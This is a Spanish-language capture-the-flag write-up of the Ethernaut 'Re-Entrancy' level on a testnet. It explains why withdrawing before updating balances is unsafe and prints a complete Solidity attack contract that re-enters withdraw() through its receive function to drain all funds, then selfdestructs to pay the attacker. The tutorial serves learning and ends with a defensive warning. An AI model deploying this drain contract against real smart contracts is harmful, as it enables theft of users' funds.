# Re-Entrancy

> Estas son las instrucciones en las que se basan este vídeo:

<p align="center">
  <a href="https://www.youtube.com/watch?v=zfe-E7wyX-E">
    <img src="https://img.youtube.com/vi/zfe-E7wyX-E/hqdefault.jpg" alt="Link al video de Youtube">
  </a>
</p>

En este nivel **nuestro objetivo es robar todos los fondos** de este contrato. Nos indica las cosas que pueden ayudarnos:

- Contratos desconocidos pueden ejecutar código dónde no te lo esperabas.
- Métodos _fallback_.
- Excepciones `throw` y `revert`.
- Utilizar otro contrato para atacar.

Ahora, obtenemos una nueva [instancia](https://sepolia.etherscan.io/tx/0x9c818cecbb2880932585a08a6d0b4bf0390f01148317879fbb05ba151d751100) del contrato confirmando la transacción en nuestra billetera de _MetaMask_. Mientras se despliega, copiamos el código del contrato y lo pegamos en **Remix**.

## Análisis

Como el objetivo es sacar los fondos, nos vamos a centrar en las **funciones que envíen Ethers fuera del contrato**. En este caso solo ocurre en la función `withdraw()`, que establece la cantidad a través de los parámetros de entrada.

Así que nos centraremos en esta función. Cómo podemos observar, **primero se comprueba que tiene los fondos necesarios y después se envían a la dirección** que ha llamado a la función con la cantidad solicitada. Luego, se actualiza el balance restando la cantidad.

Esto es un patrón bastante malo ya que esta función **es vulnerable a un ataque de re-entrada**. Para aprovechar esta vulnerabilidad, lo que podemos hacer es llamar a esta función desde un contrato.

Este contrato **tendrá una función fallback que se activará al recibir fondos** y dentro de esta función `fallback` **volverá a llamar a la función** `withdraw()`. De esta manera, **llamaremos a esta función una y otra vez hasta que no haya fondos**, que será entonces cuándo saldrá del bucle.

## Solución

Para empezar, vamos a crear un nuevo archivo en Remix llamado `Re-entrancyAttack.sol` dónde primero vamos a definir la versión como siempre y una interfaz que contenga las funciones `donate()` y `withdraw()` del contrato original. Esto nos permite interactuar con el contrato original de una manera más fácil.

```jsx
pragma solidity ^0.8;

interface IReentrancy {
    function donate(address) external payable;

    function withdraw(uint256) external;
}
```

Después, vamos a crear un contrato llamado `Hack`, dónde vamos a definir la dirección del contrato objetivo como una variable `inmutable` y se va a establecer en el `constructor`, es decir, la tendremos que indicar al desplegar el contrato.

```jsx
contract Hack {
    IReentrancy private immutable target;

    constructor(address _target) {
        target = IReentrancy(_target);
    }
```

Luego, vamos a definir la función `attack()` que primero va a llamar a la función `donate()` del contrato original **para aumentar nuestro balance**. Después llamará a la función **withdraw()** para retirar los fondos. Después vamos a comprobar que el balance del contrato original sea 0 después de realizar el ataque para después

```jsx
    function attack() external payable {
        target.donate{value: 1e18}(address(this));
        target.withdraw(1e18);

        require(address(target).balance == 0, "target balance > 0");
        selfdestruct(payable(msg.sender));
    }
```

Por último, vamos a definir la función `fallback`, **esta función se va a ejecutar siempre que se envíen fondos a nuestro contrato**. Dentro de esta función, calcularemos el menor valor entre 1 ether y el balance del contrato original, **de esta manera sabremos cuando tenemos que parar de sacar fondos del contrato objetivo**.

```jsx
    receive() external payable {
        uint256 amount = min(1e18, address(target).balance);
        if (amount > 0) {
            target.withdraw(amount);
        }
    }
```

En la función `fallback`, hemos necesitado esta función que **simplemente devuelve el menor de los dos valores dados como parámetros** para saber el mínimo.

```jsx
    function min(uint256 x, uint256 y) private pure returns (uint256) {
        return x <= y ? x : y;
    }
```

El resultado será así:

```jsx
pragma solidity ^0.8;

interface IReentrancy {
    function donate(address) external payable;

    function withdraw(uint256) external;
}

contract Hack {
    IReentrancy private immutable target;

    constructor(address _target) {
        target = IReentrancy(_target);
    }

    function attack() external payable {
        target.donate{value: 1e18}(address(this));
        target.withdraw(1e18);

        require(address(target).balance == 0, "target balance > 0");
        selfdestruct(payable(msg.sender));
    }

    receive() external payable {
        uint256 amount = min(1e18, address(target).balance);
        if (amount > 0) {
            target.withdraw(amount);
        }
    }

    function min(uint256 x, uint256 y) private pure returns (uint256) {
        return x <= y ? x : y;
    }
}

```

## Ataque

Una vez hayamos terminado de programar nuestro contrato, **lo compilamos y vamos a desplegarlo**. Seleccionamos el entorno de _MetaMask_ y pegamos la dirección del contrato objetivo. Confirmamos la transacción para [crear el contrato](https://sepolia.etherscan.io/tx/0x1475383f634cffd2c69da8bc9d8013b3f6e7ebb047191996ed89fa45caf9d734) en la _Blockchain_.

Veremos que ha aparecido en el panel lateral, y solo tenemos la función `attack()`. Antes de usar esta función vamos a seleccionar que vamos a **mandar 1 Ether** para comenzar con el ataque. Esta función lo que va a hacer es **recibir los fondos, donarlos al contrato objetivo para aumentar el balance y luego retirar todo lo que pueda**.

Cuando este contrato reciba los fondos que hemos retirado, se ejecutará la función `fallback` que comprobará si hay fondos aún en el contrato y si es así seguirá retirando. Cuando termine, al final de la función `attack()` **tenemos una comprobación para que cuando no haya fondos, se autodestruya el contrato y nos los mande a nuestra dirección**.

Confirmamos la transacción y esperamos a que se ejecute en la _blockchain_…

Ahora en el [explorador de bloques](https://sepolia.etherscan.io/tx/0xcb6b68dc14bd919448581e15444de8b32e8026781dc930b16e14a2f66468a7c6) podemos ver lo que ha pasado:

- Primero, nuestro contrato atacante ha mandado **1 ether al objetivo**.
- Después ha retirado todo lo que ha podido del contrato original.
- Por último, se ha autodestruido pero antes nos ha enviado todos los fondos que tenía a nosotros.

Por lo que ya podemos [enviar el nivel](https://sepolia.etherscan.io/tx/0x18808809d31869758da61e70ae983d6e25360a02ea1a13bc3422d78d6a55263a) en _Ethernaut_, **el contrato objetivo está vacío!**

_Ethernaut_ nos enseña varios avisos sobre funciones que ya no se recomiendan. Además, **tenemos que asumir que no todas las direcciones a las que vamos a enviar fondos son carteras personales, también pueden ser contratos inteligentes que pueden tener código en la función fallback y re-entrar en tu contrato.**

Es un ataque bastante común y hay que tener cuidado, os recomiendo investigar más ya que **este ataque fue la causa del Hackeo de la DAO de Ethereum.**
